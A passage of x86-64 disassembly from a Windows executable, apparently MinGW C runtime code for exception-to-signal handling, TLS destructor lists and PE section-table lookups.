   140001e7c:	48 83 f8 01          	cmp    $0x1,%rax
   140001e80:	75 40                	jne    0x140001ec2
   140001e82:	ba 01 00 00 00       	mov    $0x1,%edx
   140001e87:	b9 08 00 00 00       	mov    $0x8,%ecx
   140001e8c:	e8 df 87 00 00       	call   0x14000a670
   140001e91:	84 db                	test   %bl,%bl
   140001e93:	0f 85 c7 00 00 00    	jne    0x140001f60
   140001e99:	e8 d2 f9 ff ff       	call   0x140001870
   140001e9e:	e9 bd 00 00 00       	jmp    0x140001f60
   140001ea3:	3d 02 00 00 80       	cmp    $0x80000002,%eax
   140001ea8:	0f 84 b2 00 00 00    	je     0x140001f60
   140001eae:	3d 05 00 00 c0       	cmp    $0xc0000005,%eax
   140001eb3:	74 46                	je     0x140001efb
   140001eb5:	3d 08 00 00 c0       	cmp    $0xc0000008,%eax
   140001eba:	0f 84 a0 00 00 00    	je     0x140001f60
   140001ec0:	eb 61                	jmp    0x140001f23
   140001ec2:	b9 08 00 00 00       	mov    $0x8,%ecx
   140001ec7:	e9 8e 00 00 00       	jmp    0x140001f5a
   140001ecc:	3d 1d 00 00 c0       	cmp    $0xc000001d,%eax
   140001ed1:	75 50                	jne    0x140001f23
   140001ed3:	b9 04 00 00 00       	mov    $0x4,%ecx
   140001ed8:	31 d2                	xor    %edx,%edx
   140001eda:	e8 91 87 00 00       	call   0x14000a670
   140001edf:	48 85 c0             	test   %rax,%rax
   140001ee2:	74 3f                	je     0x140001f23
   140001ee4:	48 83 f8 01          	cmp    $0x1,%rax
   140001ee8:	75 64                	jne    0x140001f4e
   140001eea:	ba 01 00 00 00       	mov    $0x1,%edx
   140001eef:	b9 04 00 00 00       	mov    $0x4,%ecx
   140001ef4:	e8 77 87 00 00       	call   0x14000a670
   140001ef9:	eb 65                	jmp    0x140001f60
   140001efb:	b9 0b 00 00 00       	mov    $0xb,%ecx
   140001f00:	31 d2                	xor    %edx,%edx
   140001f02:	e8 69 87 00 00       	call   0x14000a670
   140001f07:	48 85 c0             	test   %rax,%rax
   140001f0a:	74 17                	je     0x140001f23
   140001f0c:	48 83 f8 01          	cmp    $0x1,%rax
   140001f10:	75 43                	jne    0x140001f55
   140001f12:	ba 01 00 00 00       	mov    $0x1,%edx
   140001f17:	b9 0b 00 00 00       	mov    $0xb,%ecx
   140001f1c:	e8 4f 87 00 00       	call   0x14000a670
   140001f21:	eb 3d                	jmp    0x140001f60
   140001f23:	48 8b 05 ee e2 2b 00 	mov    0x2be2ee(%rip),%rax        # 0x1402c0218
   140001f2a:	48 85 c0             	test   %rax,%rax
   140001f2d:	74 14                	je     0x140001f43
   140001f2f:	48 8b 15 d2 10 2c 00 	mov    0x2c10d2(%rip),%rdx        # 0x1402c3008
   140001f36:	48 89 f9             	mov    %rdi,%rcx
   140001f39:	48 83 c4 20          	add    $0x20,%rsp
   140001f3d:	5b                   	pop    %rbx
   140001f3e:	5f                   	pop    %rdi
   140001f3f:	5e                   	pop    %rsi
   140001f40:	48 ff e2             	rex.W jmp *%rdx
   140001f43:	31 f6                	xor    %esi,%esi
   140001f45:	eb 19                	jmp    0x140001f60
   140001f47:	b3 01                	mov    $0x1,%bl
   140001f49:	e9 19 ff ff ff       	jmp    0x140001e67
   140001f4e:	b9 04 00 00 00       	mov    $0x4,%ecx
   140001f53:	eb 05                	jmp    0x140001f5a
   140001f55:	b9 0b 00 00 00       	mov    $0xb,%ecx
   140001f5a:	ff 15 a8 10 2c 00    	call   *0x2c10a8(%rip)        # 0x1402c3008
   140001f60:	89 f0                	mov    %esi,%eax
   140001f62:	48 83 c4 20          	add    $0x20,%rsp
   140001f66:	5b                   	pop    %rbx
   140001f67:	5f                   	pop    %rdi
   140001f68:	5e                   	pop    %rsi
   140001f69:	c3                   	ret
   140001f6a:	cc                   	int3
   140001f6b:	cc                   	int3
   140001f6c:	cc                   	int3
   140001f6d:	cc                   	int3
   140001f6e:	cc                   	int3
   140001f6f:	cc                   	int3
   140001f70:	ff e0                	jmp    *%rax
   140001f72:	66 66 66 66 66 2e 0f 	data16 data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
   140001f79:	1f 84 00 00 00 00 00 
   140001f80:	c3                   	ret
   140001f81:	cc                   	int3
   140001f82:	cc                   	int3
   140001f83:	cc                   	int3
   140001f84:	cc                   	int3
   140001f85:	cc                   	int3
   140001f86:	cc                   	int3
   140001f87:	cc                   	int3
   140001f88:	cc                   	int3
   140001f89:	cc                   	int3
   140001f8a:	cc                   	int3
   140001f8b:	cc                   	int3
   140001f8c:	cc                   	int3
   140001f8d:	cc                   	int3
   140001f8e:	cc                   	int3
   140001f8f:	cc                   	int3
   140001f90:	48 89 c8             	mov    %rcx,%rax
   140001f93:	48 87 05 86 e2 2b 00 	xchg   %rax,0x2be286(%rip)        # 0x1402c0220
   140001f9a:	c3                   	ret
   140001f9b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001fa0:	48 8b 05 79 e2 2b 00 	mov    0x2be279(%rip),%rax        # 0x1402c0220
   140001fa7:	c3                   	ret
   140001fa8:	cc                   	int3
   140001fa9:	cc                   	int3
   140001faa:	cc                   	int3
   140001fab:	cc                   	int3
   140001fac:	cc                   	int3
   140001fad:	cc                   	int3
   140001fae:	cc                   	int3
   140001faf:	cc                   	int3
   140001fb0:	48 8b 05 39 94 00 00 	mov    0x9439(%rip),%rax        # 0x14000b3f0
   140001fb7:	48 8b 00             	mov    (%rax),%rax
   140001fba:	c3                   	ret
   140001fbb:	cc                   	int3
   140001fbc:	cc                   	int3
   140001fbd:	cc                   	int3
   140001fbe:	cc                   	int3
   140001fbf:	cc                   	int3
   140001fc0:	48 8b 05 31 94 00 00 	mov    0x9431(%rip),%rax        # 0x14000b3f8
   140001fc7:	48 8b 00             	mov    (%rax),%rax
   140001fca:	c3                   	ret
   140001fcb:	cc                   	int3
   140001fcc:	cc                   	int3
   140001fcd:	cc                   	int3
   140001fce:	cc                   	int3
   140001fcf:	cc                   	int3
   140001fd0:	41 56                	push   %r14
   140001fd2:	56                   	push   %rsi
   140001fd3:	57                   	push   %rdi
   140001fd4:	53                   	push   %rbx
   140001fd5:	48 83 ec 28          	sub    $0x28,%rsp
   140001fd9:	31 f6                	xor    %esi,%esi
   140001fdb:	83 3d 46 e2 2b 00 00 	cmpl   $0x0,0x2be246(%rip)        # 0x1402c0228
   140001fe2:	74 54                	je     0x140002038
   140001fe4:	48 89 d7             	mov    %rdx,%rdi
   140001fe7:	89 cb                	mov    %ecx,%ebx
   140001fe9:	b9 01 00 00 00       	mov    $0x1,%ecx
   140001fee:	ba 18 00 00 00       	mov    $0x18,%edx
   140001ff3:	e8 a8 86 00 00       	call   0x14000a6a0
   140001ff8:	48 85 c0             	test   %rax,%rax
   140001ffb:	74 36                	je     0x140002033
   140001ffd:	49 89 c6             	mov    %rax,%r14
   140002000:	89 18                	mov    %ebx,(%rax)
   140002002:	48 89 78 08          	mov    %rdi,0x8(%rax)
   140002006:	48 8d 3d 23 e2 2b 00 	lea    0x2be223(%rip),%rdi        # 0x1402c0230
   14000200d:	48 89 f9             	mov    %rdi,%rcx
   140002010:	ff 15 ea b4 00 00    	call   *0xb4ea(%rip)        # 0x14000d500
   140002016:	48 8b 05 3b e2 2b 00 	mov    0x2be23b(%rip),%rax        # 0x1402c0258
   14000201d:	49 89 46 10          	mov    %rax,0x10(%r14)
   140002021:	4c 89 35 30 e2 2b 00 	mov    %r14,0x2be230(%rip)        # 0x1402c0258
   140002028:	48 89 f9             	mov    %rdi,%rcx
   14000202b:	ff 15 e7 b4 00 00    	call   *0xb4e7(%rip)        # 0x14000d518
   140002031:	eb 05                	jmp    0x140002038
   140002033:	be ff ff ff ff       	mov    $0xffffffff,%esi
   140002038:	89 f0                	mov    %esi,%eax
   14000203a:	48 83 c4 28          	add    $0x28,%rsp
   14000203e:	5b                   	pop    %rbx
   14000203f:	5f                   	pop    %rdi
   140002040:	5e                   	pop    %rsi
   140002041:	41 5e                	pop    %r14
   140002043:	c3                   	ret
   140002044:	66 66 66 2e 0f 1f 84 	data16 data16 cs nopw 0x0(%rax,%rax,1)
   14000204b:	00 00 00 00 00 
   140002050:	56                   	push   %rsi
   140002051:	48 83 ec 20          	sub    $0x20,%rsp
   140002055:	83 3d cc e1 2b 00 00 	cmpl   $0x0,0x2be1cc(%rip)        # 0x1402c0228
   14000205c:	74 71                	je     0x1400020cf
   14000205e:	89 ce                	mov    %ecx,%esi
   140002060:	48 8d 0d c9 e1 2b 00 	lea    0x2be1c9(%rip),%rcx        # 0x1402c0230
   140002067:	ff 15 93 b4 00 00    	call   *0xb493(%rip)        # 0x14000d500
   14000206d:	48 8b 0d e4 e1 2b 00 	mov    0x2be1e4(%rip),%rcx        # 0x1402c0258
   140002074:	48 85 c9             	test   %rcx,%rcx
   140002077:	74 49                	je     0x1400020c2
   140002079:	8b 01                	mov    (%rcx),%eax
   14000207b:	39 f0                	cmp    %esi,%eax
   14000207d:	75 04                	jne    0x140002083
   14000207f:	31 c0                	xor    %eax,%eax
   140002081:	eb 24                	jmp    0x1400020a7
   140002083:	48 89 ca             	mov    %rcx,%rdx
   140002086:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   14000208d:	00 00 00 
   140002090:	48 8b 4a 10          	mov    0x10(%rdx),%rcx
   140002094:	48 85 c9             	test   %rcx,%rcx
   140002097:	74 29                	je     0x1400020c2
   140002099:	44 8b 01             	mov    (%rcx),%r8d
   14000209c:	48 89 d0             	mov    %rdx,%rax
   14000209f:	48 89 ca             	mov    %rcx,%rdx
   1400020a2:	41 39 f0             	cmp    %esi,%r8d
   1400020a5:	75 e9                	jne    0x140002090
   1400020a7:	48 8b 51 10          	mov    0x10(%rcx),%rdx
   1400020ab:	48 85 c0             	test   %rax,%rax
   1400020ae:	74 06                	je     0x1400020b6
   1400020b0:	48 89 50 10          	mov    %rdx,0x10(%rax)
   1400020b4:	eb 07                	jmp    0x1400020bd
   1400020b6:	48 89 15 9b e1 2b 00 	mov    %rdx,0x2be19b(%rip)        # 0x1402c0258
   1400020bd:	e8 ee 85 00 00       	call   0x14000a6b0
   1400020c2:	48 8d 0d 67 e1 2b 00 	lea    0x2be167(%rip),%rcx        # 0x1402c0230
   1400020c9:	ff 15 49 b4 00 00    	call   *0xb449(%rip)        # 0x14000d518
   1400020cf:	31 c0                	xor    %eax,%eax
   1400020d1:	48 83 c4 20          	add    $0x20,%rsp
   1400020d5:	5e                   	pop    %rsi
   1400020d6:	c3                   	ret
   1400020d7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   1400020de:	00 00 
   1400020e0:	41 56                	push   %r14
   1400020e2:	56                   	push   %rsi
   1400020e3:	57                   	push   %rdi
   1400020e4:	53                   	push   %rbx
   1400020e5:	48 83 ec 28          	sub    $0x28,%rsp
   1400020e9:	83 fa 03             	cmp    $0x3,%edx
   1400020ec:	0f 87 80 01 00 00    	ja     0x140002272
   1400020f2:	89 d0                	mov    %edx,%eax
   1400020f4:	48 8d 0d 05 93 00 00 	lea    0x9305(%rip),%rcx        # 0x14000b400
   1400020fb:	48 63 04 81          	movslq (%rcx,%rax,4),%rax
   1400020ff:	48 01 c8             	add    %rcx,%rax
   140002102:	ff e0                	jmp    *%rax
   140002104:	83 3d 1d e1 2b 00 00 	cmpl   $0x0,0x2be11d(%rip)        # 0x1402c0228
   14000210b:	0f 84 07 01 00 00    	je     0x140002218
   140002111:	48 8d 0d 18 e1 2b 00 	lea    0x2be118(%rip),%rcx        # 0x1402c0230
   140002118:	ff 15 e2 b3 00 00    	call   *0xb3e2(%rip)        # 0x14000d500
   14000211e:	48 8b 3d 33 e1 2b 00 	mov    0x2be133(%rip),%rdi        # 0x1402c0258
   140002125:	48 85 ff             	test   %rdi,%rdi
   140002128:	0f 84 dd 00 00 00    	je     0x14000220b
   14000212e:	48 8b 1d fb b3 00 00 	mov    0xb3fb(%rip),%rbx        # 0x14000d530
   140002135:	4c 8b 35 cc b3 00 00 	mov    0xb3cc(%rip),%r14        # 0x14000d508
   14000213c:	eb 0f                	jmp    0x14000214d
   14000213e:	66 90                	xchg   %ax,%ax
   140002140:	48 8b 7f 10          	mov    0x10(%rdi),%rdi
   140002144:	48 85 ff             	test   %rdi,%rdi
   140002147:	0f 84 be 00 00 00    	je     0x14000220b
   14000214d:	8b 0f                	mov    (%rdi),%ecx
   14000214f:	ff d3                	call   *%rbx
   140002151:	48 89 c6             	mov    %rax,%rsi
   140002154:	41 ff d6             	call   *%r14
   140002157:	85 c0                	test   %eax,%eax
   140002159:	75 e5                	jne    0x140002140
   14000215b:	48 85 f6             	test   %rsi,%rsi
   14000215e:	74 e0                	je     0x140002140
   140002160:	48 8b 47 08          	mov    0x8(%rdi),%rax
   140002164:	48 89 f1             	mov    %rsi,%rcx
   140002167:	ff 15 9b 0e 2c 00    	call   *0x2c0e9b(%rip)        # 0x1402c3008
   14000216d:	eb d1                	jmp    0x140002140
   14000216f:	83 3d b2 e0 2b 00 00 	cmpl   $0x0,0x2be0b2(%rip)        # 0x1402c0228
   140002176:	75 0d                	jne    0x140002185
   140002178:	48 8d 0d b1 e0 2b 00 	lea    0x2be0b1(%rip),%rcx        # 0x1402c0230
   14000217f:	ff 15 8b b3 00 00    	call   *0xb38b(%rip)        # 0x14000d510
   140002185:	c7 05 99 e0 2b 00 01 	movl   $0x1,0x2be099(%rip)        # 0x1402c0228
   14000218c:	00 00 00 
   14000218f:	e9 de 00 00 00       	jmp    0x140002272
   140002194:	e8 d7 f6 ff ff       	call   0x140001870
   140002199:	e9 d4 00 00 00       	jmp    0x140002272
   14000219e:	83 3d 83 e0 2b 00 00 	cmpl   $0x0,0x2be083(%rip)        # 0x1402c0228
   1400021a5:	0f 84 c7 00 00 00    	je     0x140002272
   1400021ab:	48 8d 0d 7e e0 2b 00 	lea    0x2be07e(%rip),%rcx        # 0x1402c0230
   1400021b2:	ff 15 48 b3 00 00    	call   *0xb348(%rip)        # 0x14000d500
   1400021b8:	48 8b 3d 99 e0 2b 00 	mov    0x2be099(%rip),%rdi        # 0x1402c0258
   1400021bf:	48 85 ff             	test   %rdi,%rdi
   1400021c2:	0f 84 9d 00 00 00    	je     0x140002265
   1400021c8:	48 8b 1d 61 b3 00 00 	mov    0xb361(%rip),%rbx        # 0x14000d530
   1400021cf:	4c 8b 35 32 b3 00 00 	mov    0xb332(%rip),%r14        # 0x14000d508
   1400021d6:	eb 11                	jmp    0x1400021e9
   1400021d8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   1400021df:	00 
   1400021e0:	48 8b 7f 10          	mov    0x10(%rdi),%rdi
   1400021e4:	48 85 ff             	test   %rdi,%rdi
   1400021e7:	74 7c                	je     0x140002265
   1400021e9:	8b 0f                	mov    (%rdi),%ecx
   1400021eb:	ff d3                	call   *%rbx
   1400021ed:	48 89 c6             	mov    %rax,%rsi
   1400021f0:	41 ff d6             	call   *%r14
   1400021f3:	85 c0                	test   %eax,%eax
   1400021f5:	75 e9                	jne    0x1400021e0
   1400021f7:	48 85 f6             	test   %rsi,%rsi
   1400021fa:	74 e4                	je     0x1400021e0
   1400021fc:	48 8b 47 08          	mov    0x8(%rdi),%rax
   140002200:	48 89 f1             	mov    %rsi,%rcx
   140002203:	ff 15 ff 0d 2c 00    	call   *0x2c0dff(%rip)        # 0x1402c3008
   140002209:	eb d5                	jmp    0x1400021e0
   14000220b:	48 8d 0d 1e e0 2b 00 	lea    0x2be01e(%rip),%rcx        # 0x1402c0230
   140002212:	ff 15 00 b3 00 00    	call   *0xb300(%rip)        # 0x14000d518
   140002218:	8b 05 0a e0 2b 00    	mov    0x2be00a(%rip),%eax        # 0x1402c0228
   14000221e:	83 f8 01             	cmp    $0x1,%eax
   140002221:	75 4f                	jne    0x140002272
   140002223:	48 8b 0d 2e e0 2b 00 	mov    0x2be02e(%rip),%rcx        # 0x1402c0258
   14000222a:	48 85 c9             	test   %rcx,%rcx
   14000222d:	74 12                	je     0x140002241
   14000222f:	90                   	nop
   140002230:	48 8b 71 10          	mov    0x10(%rcx),%rsi
   140002234:	e8 77 84 00 00       	call   0x14000a6b0
   140002239:	48 89 f1             	mov    %rsi,%rcx
   14000223c:	48 85 f6             	test   %rsi,%rsi
   14000223f:	75 ef                	jne    0x140002230
   140002241:	48 c7 05 0c e0 2b 00 	movq   $0x0,0x2be00c(%rip)        # 0x1402c0258
   140002248:	00 00 00 00 
   14000224c:	c7 05 d2 df 2b 00 00 	movl   $0x0,0x2bdfd2(%rip)        # 0x1402c0228
   140002253:	00 00 00 
   140002256:	48 8d 0d d3 df 2b 00 	lea    0x2bdfd3(%rip),%rcx        # 0x1402c0230
   14000225d:	ff 15 95 b2 00 00    	call   *0xb295(%rip)        # 0x14000d4f8
   140002263:	eb 0d                	jmp    0x140002272
   140002265:	48 8d 0d c4 df 2b 00 	lea    0x2bdfc4(%rip),%rcx        # 0x1402c0230
   14000226c:	ff 15 a6 b2 00 00    	call   *0xb2a6(%rip)        # 0x14000d518
   140002272:	b8 01 00 00 00       	mov    $0x1,%eax
   140002277:	48 83 c4 28          	add    $0x28,%rsp
   14000227b:	5b                   	pop    %rbx
   14000227c:	5f                   	pop    %rdi
   14000227d:	5e                   	pop    %rsi
   14000227e:	41 5e                	pop    %r14
   140002280:	c3                   	ret
   140002281:	cc                   	int3
   140002282:	cc                   	int3
   140002283:	cc                   	int3
   140002284:	cc                   	int3
   140002285:	cc                   	int3
   140002286:	cc                   	int3
   140002287:	cc                   	int3
   140002288:	cc                   	int3
   140002289:	cc                   	int3
   14000228a:	cc                   	int3
   14000228b:	cc                   	int3
   14000228c:	cc                   	int3
   14000228d:	cc                   	int3
   14000228e:	cc                   	int3
   14000228f:	cc                   	int3
   140002290:	56                   	push   %rsi
   140002291:	48 83 ec 20          	sub    $0x20,%rsp
   140002295:	89 ce                	mov    %ecx,%esi
   140002297:	e8 24 84 00 00       	call   0x14000a6c0
   14000229c:	89 f1                	mov    %esi,%ecx
   14000229e:	48 8d 0c 49          	lea    (%rcx,%rcx,2),%rcx
   1400022a2:	48 c1 e1 04          	shl    $0x4,%rcx
   1400022a6:	48 01 c8             	add    %rcx,%rax
   1400022a9:	48 83 c4 20          	add    $0x20,%rsp
   1400022ad:	5e                   	pop    %rsi
   1400022ae:	c3                   	ret
   1400022af:	cc                   	int3
   1400022b0:	0f b7 11             	movzwl (%rcx),%edx
   1400022b3:	31 c0                	xor    %eax,%eax
   1400022b5:	81 fa 4d 5a 00 00    	cmp    $0x5a4d,%edx
   1400022bb:	75 1d                	jne    0x1400022da
   1400022bd:	48 63 51 3c          	movslq 0x3c(%rcx),%rdx
   1400022c1:	81 3c 11 50 45 00 00 	cmpl   $0x4550,(%rcx,%rdx,1)
   1400022c8:	75 10                	jne    0x1400022da
   1400022ca:	0f b7 4c 11 18       	movzwl 0x18(%rcx,%rdx,1),%ecx
   1400022cf:	31 c0                	xor    %eax,%eax
   1400022d1:	81 f9 0b 02 00 00    	cmp    $0x20b,%ecx
   1400022d7:	0f 94 c0             	sete   %al
   1400022da:	c3                   	ret
   1400022db:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400022e0:	48 63 41 3c          	movslq 0x3c(%rcx),%rax
   1400022e4:	44 0f b7 44 01 06    	movzwl 0x6(%rcx,%rax,1),%r8d
   1400022ea:	45 85 c0             	test   %r8d,%r8d
   1400022ed:	74 2b                	je     0x14000231a
   1400022ef:	48 01 c1             	add    %rax,%rcx
   1400022f2:	0f b7 41 14          	movzwl 0x14(%rcx),%eax
   1400022f6:	48 01 c8             	add    %rcx,%rax
   1400022f9:	48 83 c0 18          	add    $0x18,%rax
   1400022fd:	eb 0a                	jmp    0x140002309
   1400022ff:	90                   	nop
   140002300:	48 83 c0 28          	add    $0x28,%rax
   140002304:	41 ff c8             	dec    %r8d
   140002307:	74 11                	je     0x14000231a
   140002309:	8b 48 0c             	mov    0xc(%rax),%ecx
   14000230c:	48 39 d1             	cmp    %rdx,%rcx
   14000230f:	77 ef                	ja     0x140002300
   140002311:	03 48 08             	add    0x8(%rax),%ecx
   140002314:	48 39 d1             	cmp    %rdx,%rcx
   140002317:	76 e7                	jbe    0x140002300
   140002319:	c3                   	ret
   14000231a:	31 c0                	xor    %eax,%eax
   14000231c:	c3                   	ret
   14000231d:	0f 1f 00             	nopl   (%rax)
   140002320:	56                   	push   %rsi
   140002321:	57                   	push   %rdi
   140002322:	53                   	push   %rbx
   140002323:	48 83 ec 20          	sub    $0x20,%rsp
   140002327:	48 89 ce             	mov    %rcx,%rsi
   14000232a:	e8 a1 82 00 00       	call   0x14000a5d0
   14000232f:	31 ff                	xor    %edi,%edi
   140002331:	48 83 f8 08          	cmp    $0x8,%rax
   140002335:	77 68                	ja     0x14000239f
   140002337:	48 8b 05 ca 8c 00 00 	mov    0x8cca(%rip),%rax        # 0x14000b008
   14000233e:	0f b7 08             	movzwl (%rax),%ecx
   140002341:	81 f9 4d 5a 00 00    	cmp    $0x5a4d,%ecx
   140002347:	75 56                	jne    0x14000239f
   140002349:	48 63 48 3c          	movslq 0x3c(%rax),%rcx
   14000234d:	81 3c 08 50 45 00 00 	cmpl   $0x4550,(%rax,%rcx,1)
   140002354:	75 47                	jne    0x14000239d
   140002356:	48 01 c8             	add    %rcx,%rax
   140002359:	0f b7 48 18          	movzwl 0x18(%rax),%ecx
   14000235d:	81 f9 0b 02 00 00    	cmp    $0x20b,%ecx
   140002363:	75 38                	jne    0x14000239d
   140002365:	0f b7 58 06          	movzwl 0x6(%rax),%ebx
   140002369:	85 db                	test   %ebx,%ebx
   14000236b:	74 30                	je     0x14000239d
   14000236d:	0f b7 48 14          	movzwl 0x14(%rax),%ecx
   140002371:	48 8d 3c 01          	lea    (%rcx,%rax,1),%rdi
   140002375:	48 83 c7 18          	add    $0x18,%rdi
   140002379:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140002380:	41 b8 08 00 00 00    	mov    $0x8,%r8d
   140002386:	48 89 f9             	mov    %rdi,%rcx
   140002389:	48 89 f2             	mov    %rsi,%rdx
   14000238c:	e8 3f 83 00 00       	call   0x14000a6d0
   140002391:	85 c0                	test   %eax,%eax
   140002393:	74 0a                	je     0x14000239f
   140002395:	48 83 c7 28          	add    $0x28,%rdi
   140002399:	ff cb                	dec    %ebx
   14000239b:	75 e3                	jne    0x140002380
   14000239d:	31 ff                	xor    %edi,%edi
   14000239f:	48 89 f8             	mov    %rdi,%rax
   1400023a2:	48 83 c4 20          	add    $0x20,%rsp
   1400023a6:	5b                   	pop    %rbx
   1400023a7:	5f                   	pop    %rdi
   1400023a8:	5e                   	pop    %rsi
   1400023a9:	c3                   	ret
   1400023aa:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   1400023b0:	48 8b 05 51 8c 00 00 	mov    0x8c51(%rip),%rax        # 0x14000b008
   1400023b7:	0f b7 10             	movzwl (%rax),%edx
   1400023ba:	81 fa 4d 5a 00 00    	cmp    $0x5a4d,%edx
   1400023c0:	75 5a                	jne    0x14000241c
   1400023c2:	48 63 50 3c          	movslq 0x3c(%rax),%rdx
   1400023c6:	81 3c 10 50 45 00 00 	cmpl   $0x4550,(%rax,%rdx,1)
   1400023cd:	75 4d                	jne    0x14000241c
   1400023cf:	48 01 d0             	add    %rdx,%rax
   1400023d2:	0f b7 50 18          	movzwl 0x18(%rax),%edx
   1400023d6:	81 fa 0b 02 00 00    	cmp    $0x20b,%edx
   1400023dc:	75 3e                	jne    0x14000241c
   1400023de:	0f b7 50 06          	movzwl 0x6(%rax),%edx
   1400023e2:	85 d2                	test   %edx,%edx
   1400023e4:	74 36                	je     0x14000241c
   1400023e6:	48 2b 0d 1b 8c 00 00 	sub    0x8c1b(%rip),%rcx        # 0x14000b008
   1400023ed:	44 0f b7 40 14       	movzwl 0x14(%rax),%r8d
   1400023f2:	4c 01 c0             	add    %r8,%rax
   1400023f5:	48 83 c0 18          	add    $0x18,%rax
   1400023f9:	eb 0d                	jmp    0x140002408
   1400023fb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002400:	48 83 c0 28          	add    $0x28,%rax
   140002404:	ff ca                	dec    %edx
   140002406:	74 14                	je     0x14000241c
   140002408:	44 8b 40 0c          	mov    0xc(%rax),%r8d
   14000240c:	4c 39 c1             	cmp    %r8,%rcx
   14000240f:	72 ef                	jb     0x140002400
   140002411:	44 03 40 08          	add    0x8(%rax),%r8d
   140002415:	4c 39 c1             	cmp    %r8,%rcx
   140002418:	73 e6                	jae    0x140002400
   14000241a:	eb 02                	jmp    0x14000241e
   14000241c:	31 c0                	xor    %eax,%eax
   14000241e:	c3                   	ret
   14000241f:	90                   	nop
   140002420:	48 8b 0d e1 8b 00 00 	mov    0x8be1(%rip),%rcx        # 0x14000b008
   140002427:	0f b7 11             	movzwl (%rcx),%edx
   14000242a:	31 c0                	xor    %eax,%eax
   14000242c:	81 fa 4d 5a 00 00    	cmp    $0x5a4d,%edx
   140002432:	75 21                	jne    0x140002455
   140002434:	48 63 51 3c          	movslq 0x3c(%rcx),%rdx
   140002438:	81 3c 11 50 45 00 00 	cmpl   $0x4550,(%rcx,%rdx,1)
   14000243f:	75 14                	jne    0x140002455
   140002441:	44 0f b7 44 11 18    	movzwl 0x18(%rcx,%rdx,1),%r8d
   140002447:	41 81 f8 0b 02 00 00 	cmp    $0x20b,%r8d
   14000244e:	75 05                	jne    0x140002455
   140002450:	0f b7 44 11 06       	movzwl 0x6(%rcx,%rdx,1),%eax
   140002455:	c3                   	ret
   140002456:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   14000245d:	00 00 00 
   140002460:	48 8b 05 a1 8b 00 00 	mov    0x8ba1(%rip),%rax        # 0x14000b008
   140002467:	0f b7 10             	movzwl (%rax),%edx
   14000246a:	81 fa 4d 5a 00 00    	cmp    $0x5a4d,%edx
   140002470:	75 56                	jne    0x1400024c8
   140002472:	48 63 50 3c          	movslq 0x3c(%rax),%rdx
   140002476:	81 3c 10 50 45 00 00 	cmpl   $0x4550,(%rax,%rdx,1)
   14000247d:	75 49                	jne    0x1400024c8
   14000247f:	48 01 d0             	add    %rdx,%rax
   140002482:	0f b7 50 18          	movzwl 0x18(%rax),%edx
   140002486:	81 fa 0b 02 00 00    	cmp    $0x20b,%edx
   14000248c:	75 3a                	jne    0x1400024c8
   14000248e:	0f b7 50 06          	movzwl 0x6(%rax),%edx
   140002492:	85 d2                	test   %edx,%edx
   140002494:	74 32                	je     0x1400024c8
   140002496:	44 0f b7 40 14       	movzwl 0x14(%rax),%r8d
   14000249b:	4c 01 c0             	add    %r8,%rax
   14000249e:	48 83 c0 18          	add    $0x18,%rax
   1400024a2:	eb 14                	jmp    0x1400024b8
   1400024a4:	66 66 66 2e 0f 1f 84 	data16 data16 cs nopw 0x0(%rax,%rax,1)
   1400024ab:	00 00 00 00 00 
   1400024b0:	48 83 c0 28          	add    $0x28,%rax
   1400024b4:	ff ca                	dec    %edx
   1400024b6:	74 10                	je     0x1400024c8
   1400024b8:	f6 40 27 20          	testb  $0x20,0x27(%rax)
   1400024bc:	74 f2                	je     0x1400024b0
   1400024be:	48 85 c9             	test   %rcx,%rcx
   1400024c1:	74 07                	je     0x1400024ca
   1400024c3:	48 ff c9             	dec    %rcx
   1400024c6:	eb e8                	jmp    0x1400024b0
   1400024c8:	31 c0                	xor    %eax,%eax
   1400024ca:	c3                   	ret
   1400024cb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400024d0:	48 8b 05 31 8b 00 00 	mov    0x8b31(%rip),%rax        # 0x14000b008
   1400024d7:	0f b7 08             	movzwl (%rax),%ecx
   1400024da:	81 f9 4d 5a 00 00    	cmp    $0x5a4d,%ecx
   1400024e0:	75 1a                	jne    0x1400024fc
   1400024e2:	48 63 48 3c          	movslq 0x3c(%rax),%rcx
   1400024e6:	81 3c 08 50 45 00 00 	cmpl   $0x4550,(%rax,%rcx,1)
   1400024ed:	75 0d                	jne    0x1400024fc
   1400024ef:	0f b7 4c 08 18       	movzwl 0x18(%rax,%rcx,1),%ecx
   1400024f4:	81 f9 0b 02 00 00    	cmp    $0x20b,%ecx
   1400024fa:	74 02                	je     0x1400024fe
   1400024fc:	31 c0                	xor    %eax,%eax
   1400024fe:	c3                   	ret
   1400024ff:	90                   	nop
   140002500:	48 8b 15 01 8b 00 00 	mov    0x8b01(%rip),%rdx        # 0x14000b008
   140002507:	44 0f b7 02          	movzwl (%rdx),%r8d
   14000250b:	31 c0                	xor    %eax,%eax
   14000250d:	41 81 f8 4d 5a 00 00 	cmp    $0x5a4d,%r8d
   140002514:	75 70                	jne    0x140002586
   140002516:	4c 63 42 3c          	movslq 0x3c(%rdx),%r8
   14000251a:	42 81 3c 02 50 45 00 	cmpl   $0x4550,(%rdx,%r8,1)
   140002521:	00 
   140002522:	75 62                	jne    0x140002586
   140002524:	4c 01 c2             	add    %r8,%rdx
   140002527:	44 0f b7 42 18       	movzwl 0x18(%rdx),%r8d
   14000252c:	41 81 f8 0b 02 00 00 	cmp    $0x20b,%r8d
   140002533:	75 51                	jne    0x140002586
   140002535:	44 0f b7 42 06       	movzwl 0x6(%rdx),%r8d
   14000253a:	4d 85 c0             	test   %r8,%r8
   14000253d:	74 47                	je     0x140002586
   14000253f:	48 2b 0d c2 8a 00 00 	sub    0x8ac2(%rip),%rcx        # 0x14000b008
   140002546:	0f b7 42 14          	movzwl 0x14(%rdx),%eax
   14000254a:	48 01 d0             	add    %rdx,%rax
   14000254d:	48 83 c0 18          	add    $0x18,%rax
   140002551:	49 c1 e0 03          	shl    $0x3,%r8
